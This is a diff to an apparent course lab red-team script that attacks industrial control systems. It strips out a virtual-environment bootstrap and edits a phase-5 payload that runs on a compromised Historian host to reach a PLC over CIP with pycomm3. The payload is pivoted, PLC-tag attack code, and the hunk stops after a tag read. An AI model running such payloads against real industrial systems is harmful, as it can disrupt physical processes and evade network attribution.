@@ -11,24 +11,6 @@ from datetime import datetime
 from dataclasses import dataclass, field
 from typing import Optional
 
-# ── Virtual environment bootstrap ────────────────────────────────────────────
-# Re-exec inside ~/attack_script/venv if not already running there.
-VENV_DIR    = os.path.expanduser("~/attack_script/venv")
-VENV_PYTHON = os.path.join(VENV_DIR, "bin", "python3")
-VENV_ACTIVATE = os.path.join(VENV_DIR, "bin", "activate")
-
-def _ensure_venv():
-    if not os.path.exists(VENV_PYTHON):
-        print("[!] venv not found. Run the following to create it:")
-        print(f"    python3 -m venv {VENV_DIR}")
-        print(f"    source {VENV_ACTIVATE}")
-        print("    pip install rich paramiko pycomm3")
-        sys.exit(1)
-    # If we're not already running inside the venv, re-exec with venv Python
-    if os.path.realpath(sys.executable) != os.path.realpath(VENV_PYTHON):
-        os.execv(VENV_PYTHON, [VENV_PYTHON] + sys.argv)
-
-_ensure_venv()
 
 # ── Dependency bootstrap (inside venv) ───────────────────────────────────────
 def _require(pkg, import_name=None):
@@ -126,8 +108,7 @@ def banner():
     console.print(Panel(
         "[bold white]INCS 4810 — Red Team Attack Chain[/bold white]  "
         "[dim]|  BCIT SW01-3550  |  ISA/IEC 62443[/dim]\n"
-        "[dim]Instructor: Victor Mendez  "
-        f"|  venv: {VENV_DIR}[/dim]\n"
+        "[dim]Instructor: Victor Mendez  |  BCIT SW01-3550[/dim]\n"
         "[bold yellow]All actions are authorized and confined to the isolated lab network.[/bold yellow]",
         border_style="red",
         expand=False,
@@ -586,7 +567,7 @@ def phase5_plc_attack() -> PhaseResult:
     # Payload runs on Historian so CIP traffic originates from 10.10.10.20.
     # source the venv first so pycomm3 is available on the remote host.
     payload = (
-        f"source {VENV_ACTIVATE} && python3 - <<'PYEOF'\n"
+        f"python3 - <<'PYEOF'\n"
         f"from pycomm3 import LogixDriver\n"
         f"with LogixDriver('{plc_ip}') as plc:\n"
         f"    cur = plc.read('{tag}')\n"
